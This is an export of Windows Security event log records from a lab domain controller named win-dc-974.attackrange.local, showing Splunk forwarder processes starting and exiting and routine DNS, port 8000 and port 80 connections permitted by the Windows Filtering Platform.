Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382292
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1de4
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
	Exit Status:	0x1
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382291
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1de4
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382290
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		52821
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382289
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		52821
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382288
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		57968
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:54:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382287
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		57968
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382296
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1bd8
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
	Exit Status:	0x1
03/01/2021 10:54:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382295
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55137
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382294
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55137
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382300
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1fac
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Exit Status:	0x1
03/01/2021 10:54:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382299
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1fac
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382298
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60549
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382297
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60464
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382305
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x15dc
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382304
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1f1c
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Exit Status:	0x1
03/01/2021 10:54:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382303
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f1c
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe" --ps2

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382302
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55138
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382301
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55138
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382310
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x21e0
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe
	Exit Status:	0x1
03/01/2021 10:54:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382309
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x21e0
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:54:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382308
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61680
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382307
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60589
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382306
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x15dc
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe
	Exit Status:	0x1
03/01/2021 10:54:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382312
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55139
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382311
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55139
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:18 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382317
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60368
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:18 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382316
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		64525
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:18 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382315
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		64525
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:18 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382314
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64525
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:18 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382313
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64525
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:19 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382319
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		64525
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:54:19 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382318
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		64525
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382323
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60893
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382322
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382321
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:21 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382320
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382333
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382332
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55141
	Destination Address:	8.240.191.254
	Destination Port:		80
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382331
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55141
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
